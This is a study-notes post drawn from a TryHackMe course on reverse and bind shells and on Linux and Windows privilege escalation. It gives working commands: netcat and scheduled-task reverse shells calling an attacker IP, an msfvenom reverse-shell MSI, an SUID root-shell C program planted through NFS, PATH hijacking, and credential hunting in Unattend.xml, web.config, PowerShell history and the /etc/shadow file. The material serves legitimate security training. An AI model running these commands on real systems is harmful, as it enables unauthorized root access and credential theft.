
Let's now tackle about Privilege Escalation, btw the source of this notes is from the course in TryHackme ;>


## I. Shells

### What a shell actually is

A shell acts as a command-line interpreter. It's what gives you direct access to the operating system's services once you've got some form of code execution on a target.

### Tools for catching shells

- **Netcat**: the classic. Also useful for banner grabbing during enumeration, not just catching shells.
- **Socat**: does the same job as netcat but is more stable, mainly because it can set up a proper terminal on both ends (more on that below).
- **Metasploit**: like socat and netcat, it can receive reverse shells, but it comes with a lot more automation and handling built in.

### Reverse shells vs bind shells

**Reverse shell**: the target is forced to execute code that connects back to your machine. You set up a listener on your box, and the target initiates the connection to you.

Example:
```
# attacker box
sudo nc -lvnp 443
listening on [any] 443 ...
connect to [11.12.223] from (UNKNOWN) [10.199.58] 43286

# target
nc 10.11.12.223 443 -e /bin/bash
```

**Bind shell**: the code executed on the target attaches a listener directly to a shell on the target itself. You then connect out to that listener.

Example:
```
# target
nc -lvnp 8080

# attacker
evil-winrm -i 10.10.2.57 -u Administrator -p 'TryH4ckM3!'
```

### Interactive vs non-interactive

Shells can be **interactive** (they require you to actually interact with them, like a normal terminal) or **non-interactive** (they don't expect interaction and you're limited in what you can run through them).

### Why netcat shells are unstable

Netcat gives you a **process**, not a **terminal**. There's no PTY (pseudo-terminal) attached, which means no job control, no line editing, and pressing Ctrl+C kills the entire session instead of just interrupting the current command.

The goal of "stabilizing" a shell is to upgrade that raw process into something that behaves like a real terminal, with tab completion, signal handling, and so on.

Common ways to do this:

- **Python PTY spawn**: `python -c 'import pty; pty.spawn("/bin/bash")'` spawns a shell inside a proper PTY.
- **rlwrap**: wraps a netcat listener and gives you PTY-like features (command history, line editing) without a full PTY.
- **Socat**: creates a PTY on both ends, giving you a fully interactive session from the start.

After spawning the PTY, running `stty raw -echo; fg` on your own terminal disables local echo and line buffering, which hands full control over to the remote PTY. That's what lets arrow keys, tab, and Ctrl+C work properly inside the shell.

**Socat**, in short, is a connector between two points, which is why it's so effective at setting up a stable session on both ends at once.

## II. Linux Privilege Escalation

Privilege escalation is when an account with lower permissions gains access to a higher permission level.

### Enumeration basics

- `uname -a`: prints system information, including the kernel version in use.
- `/proc/version`: information about the target's running processes.
- `/etc/issue`: information about the operating system.
- `ps`: shows running processes.

Fields in process status output:
- **PID**: unique process ID
- **TTY**: terminal type
- **Time**: CPU time used
- **CMD**: command name

Useful process commands:
- `ps -A`: all processes
- `ps axfj`: process tree
- `ps aux`: all users' processes
- `env`: environment variables
- `sudo -l`: list sudo privileges for the current user

### Netstat

- `netstat -tp`: connections along with the service name and PID
- `netstat -l`: listening ports
- `netstat -i`: interface statistics
- `netstat -ano`: a common combo showing all sockets with no name resolution and timers displayed
  - `-a`: all sockets
  - `-n`: no name resolution
  - `-o`: display timers

Worth noting: some information, like PID ownership details, may require root privileges to see fully.

### Find command

By name or location:
```
find . -name flag1.txt
find /home -name flag1.txt
find / -type d -name config
```

By permissions:
```
find / -type f -perm 0777       # read/write/exec by all
find / -perm a=x                # executable files
find / -perm -222 -type d       # world-writable folders
find / -perm -o w -type d       # world-writable folders
find / -perm -o x -type d       # world-executable folders
find / -perm -u=s -type f       # SUID bit set, potential privesc vector
```

By user, time, or size:
```
find /home -user frank
find / -mtime 10       # modified in the last 10 days
find / -atime 10       # accessed in the last 10 days
find / -cmin -60       # changed in the last hour
find / -amin -60       # accessed in the last hour
find / -size 50M       # exactly 50 MB
find / -size +100M     # larger than 100 MB
```

Tip: add `2>/dev/null` to suppress permission errors and clean up the output, e.g. `find / -type f -perm 0777 2>/dev/null`.

### Kernel exploits

The kernel manages communication between components like memory and applications. If it's outdated, it may have a known public exploit.

Method: identify the kernel version, search for a matching exploit, run it.

### Sudo misconfigurations

`sudo` allows a user to run a program with root privileges. `sudo -l` shows which binaries the current user can run as root, which then opens the door to checking those binaries against [GTFOBins](https://gtfobins.github.io/), a resource that documents how programs you have sudo rights over can be abused to spawn a shell or escalate privileges.

One specific technique here is **LD_PRELOAD**, a library hijacking trick that abuses the dynamic linker. It lets you force a compiled binary to load a custom shared library before the standard system libraries load. If `env_keep` is set in the sudoers file, this becomes a privilege escalation path, since your malicious library (which could just spawn a shell) executes the moment the sudo command runs.

### SUID and SGID

- **SUID (Set-user ID)**: the file executes with the permissions of its owner (usually root), not the user actually running it.
- **SGID (Set-group ID)**: the file executes with the permissions of the group that owns it.

To find SUID binaries:
```
find / -type f -perm -04000 -ls 2>/dev/null
```

To hash a password (useful for creating a new user entry manually):
```
openssl passwd -1 -salt THM password1
```

Useful reads once you have some access:
```
cat /etc/passwd | tail
base64 /etc/shadow | base64 -d
```
The base64-encode-then-decode trick can sometimes bypass restrictions on directly reading a protected file.

### GTFOBins

GTFOBins is a curated list of UNIX binaries that can be used to bypass local security restrictions on misconfigured systems. It documents how ordinary, legitimate programs (`find`, `vim`, `nmap`, and plenty of others) can be abused if you have any kind of elevated access to them, whether that's SUID, sudo rights, or a capability.

The general idea: if a low-privileged user has any kind of special access to a "trusted" binary, and that binary happens to have a documented escape method, you can use it to jump straight to root.

### Capabilities

Linux capabilities are a more granular privilege system than the traditional all-or-nothing root model. Instead of a binary being fully privileged or not, it can be granted specific pieces of root's power.

Command to check for interesting capabilities:
```
getcap -r / 2>/dev/null
```

Key terms:
- **cap_setuid**: the ability to change user IDs. If a binary has this, you can potentially use it to switch to UID 0.
- **Permitted (p)**: the capability is allowed for the binary.
- **Effective (e)**: the capability is actually turned on and active while the program runs.

A few common capabilities and what they enable:

| Capability | What it allows |
|---|---|
| cap_setuid | Change user IDs, force a switch to root |
| cap_dac_override | Ignore file permission checks, read `/etc/shadow` or write to `/etc/passwd` |
| cap_sys_ptrace | Debug or inject code into another running process, including ones running as root |

The point of all this: even a small, seemingly limited capability can be enough to fully compromise the system if it's the right one.

### Cron jobs

Cron jobs are automated tasks that run scripts or binaries at scheduled times. `/etc/crontab` lists what's currently scheduled.

The vulnerability shows up when a task is scheduled to run as root, but a regular user has some way to interfere with how that task executes, for example if the script it calls is writable.

Example of exploiting a writable cron script:
```
echo "cp /home/ubuntu/flag5.txt /home/karen/flag5.txt; chmod 777 /home/karen/flag5.txt" > /home/karen/backup.sh
```
If that script runs as root on a schedule, the copied file ends up readable by the low-privileged user.

### PATH hijacking

`PATH` is the list of directories Linux searches through when you run a command without specifying its full path.

The vulnerability occurs when a SUID binary calls another command (like `cat` or a custom tool) without using its absolute path. Since the system has to search `PATH` to find that command, you can plant your own malicious version earlier in the search order.

Exploitation steps:

1. **Find or create a writable spot in PATH.** Check if any directory currently in `PATH` is writable. If not, hijack `PATH` itself by putting a writable directory first:
   ```
   export PATH=/tmp:$PATH
   ```
   This tells Linux to check `/tmp` before anywhere else.

2. **Create the impostor binary.** Make a file in that writable directory with the exact name of the command the SUID binary is calling. For example:
   ```
   echo "/bin/bash -p" > /tmp/thm
   chmod +x /tmp/thm
   ```

3. **Trigger it.** Run the original SUID binary. It calls the unqualified command name, PATH resolution finds your fake version first, and it executes with the SUID binary's elevated privileges.

### NFS (no_root_squash)

NFS shares can be configured with `no_root_squash`, which allows a client machine to claim any UID it wants, including root, and have the NFS server honor it.

Exploitation steps:

1. **Discovery.** On the target, check the exports file:
   ```
   cat /etc/exports
   ```
   Look for something like `/tmp *(rw,sync,no_root_squash)`. If `no_root_squash` is present, the share is vulnerable.

2. **Mounting.** From your attack machine:
   ```
   showmount -e <TARGET_IP>
   mkdir /tmp/target_mount
   mount -o rw <TARGET_IP>:/tmp /tmp/target_mount
   ```

3. **Planting the payload.** Inside that mounted folder, write a small C program that spawns a shell, then compile and set the SUID bit while you're root on your own machine:
   ```c
   int main() {
       setgid(0);
       setuid(0);
       system("/bin/bash");
       return 0;
   }
   ```
   ```
   gcc shell.c -o shell
   chmod +s shell
   ```

4. **Execution.** Back on your low-privileged session on the target, navigate to the shared folder and run the binary:
   ```
   ./shell
   ```
   Because the SUID bit was set while the share had `no_root_squash`, the target executes it as root.

## III. Windows Privilege Escalation

Common weaknesses to look for on Windows:
- Misconfigured services or scheduled tasks
- Excessive privileges assigned to the current account
- Vulnerable software
- Missing security patches

### Information gathering and credential hunting

The goal here is finding credentials that administrators or automated processes left behind, whether that's in a config file, a history log, or a saved credential store.

**Unattended installation files.** Used by admins deploying Windows via Windows Deployment Services. These configuration files sometimes still contain the local administrator password in plaintext or base64.

Paths worth checking:
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

**PowerShell history.** Windows logs every command run in PowerShell. If someone typed a password directly into a command (like `net use`), it ends up saved in plaintext.

From CMD:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

From PowerShell:
```
Get-Content $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Saved credentials via `cmdkey`.** Windows lets users save credentials for other accounts. You can't view the password directly, but you can use the saved credential to launch a process as that account.

Workflow:
```
cmdkey /list
runas /savecred /user:admin cmd.exe
```

**IIS configuration (`web.config`).** IIS stores site configuration, including database connection strings with usernames and passwords, in `web.config` files.

Common locations:
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Quick search:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**Software credentials (PuTTY example).** Third-party apps like PuTTY, WinSCP, FileZilla, and browsers often store saved passwords. PuTTY doesn't store SSH passwords, but it does store proxy credentials in the registry.

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Scheduled tasks

Scheduled tasks can be a straightforward privesc path if you have write access to the binary or script a high-privileged task points to.

Workflow:
1. Enumerate all tasks: `schtasks /query /fo list /v`
2. Inspect a specific task, looking for "Task to Run" and "Run As User": `schtasks /query /tn <taskname> /fo list /v`
3. Check permissions on that binary using `icacls`, looking for Full Control (F) or Modify (M) for your user: `icacls C:\path\to\binary.bat`
4. If you have write access, overwrite it, for example pointing it at a reverse shell: `echo C:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <PORT> > C:\path\to\binary.bat`
5. Trigger it, either by waiting for the schedule or manually: `schtasks /run /tn <taskname>`

### AlwaysInstallElevated

This is a Windows policy that, when enabled, allows any user to install `.msi` packages with SYSTEM privileges. It's a high-risk setting that's rarely seen configured this way in properly secured environments.

Both of these registry keys need to be set to 1 for it to work:
```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Exploitation:
1. Generate a malicious MSI with msfvenom:
   ```
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o setup.msi
   ```
2. Transfer it to the target and run it silently. Because of the policy, it's forced to run as SYSTEM regardless of the current user's privileges:
   ```
   msiexec /quiet /qn /i C:\path\to\setup.msi
   ```

### Service misconfigurations

Windows services are managed by the Service Control Manager (SCM). Since many services run as `LocalSystem`, misconfigured services are a common privesc target.

You can check a service's configuration with:
```
sc qc <service_name>
```
Two fields matter most:
- **BINARY_PATH_NAME**: the executable the SCM actually runs
- **SERVICE_START_NAME**: the account context the service runs under

**Insecure permissions on the service executable.** If the service runs as a high-privileged account but the binary itself can be overwritten by a low-privileged user, that's a direct path to escalation.

1. Check permissions with `icacls`, looking for Modify (M) or Full Control (F) granted to Everyone or Users:
   ```
   icacls C:\Path\To\Service.exe
   ```
2. Replace the binary:
   ```
   move Service.exe Service.exe.bak
   move rev-svc.exe Service.exe
   ```
3. Restart the service to trigger it:
   ```
   sc stop <service>
   sc start <service>
   ```

**Unquoted service paths.** This is a parsing issue with how Windows handles file paths that contain spaces and aren't wrapped in quotes. Given a path like `C:\My Programs\Disk Sorter\bin\service.exe`, Windows will actually try each of these in order:
```
C:\My.exe
C:\My Programs\Disk.exe
C:\My Programs\Disk Sorter\bin\service.exe   (the intended one)
```
If you have write access to `C:\My Programs\`, you can drop a malicious file named `Disk.exe` there. When the service restarts, SCM runs your file instead of the real one.

**Insecure service DACLs.** Sometimes the executable itself is fine, but the service object has a weak Discretionary Access Control List. If your account has `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` rights on it, you can just reconfigure the service directly.

1. Check the service's DACL with Sysinternals' accesschk:
   ```
   accesschk64.exe -qlc <service_name>
   ```
2. Reconfigure the binary path to point at your payload and set it to run as LocalSystem:
   ```
   sc config <service> binPath= "C:\Users\user\rev.exe" obj= LocalSystem
   ```
3. Restart the service to get a shell as NT AUTHORITY\SYSTEM.

## Resources and Tools

**Linux enumeration**
- LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- Linux Priv Checker: https://github.com/linted/linuxprivchecker

**Vulnerability lookup**
- CVE Details: https://www.cvedetails.com/

**Windows**
- PayloadsAllTheThings, Windows Privilege Escalation section
- Priv2Admin (Abusing Windows Privileges)
- RogueWinRM Exploit
- Potatoes (various potato exploits)
- Decoder's Blog
- Token Kidnapping
- HackTricks, Windows Local Privilege Escalation

## Takeaways

Most of these techniques boil down to the same underlying idea: something is running with more privilege than it should be able to trust, whether that's a binary, a script, a service, or a scheduled task, and a lower-privileged user has just enough write access or configuration control to redirect what that privileged process actually does. The enumeration step matters more than any individual exploit here. Most of the time on a real box, the hard part isn't knowing these techniques exist, it's actually finding which one applies.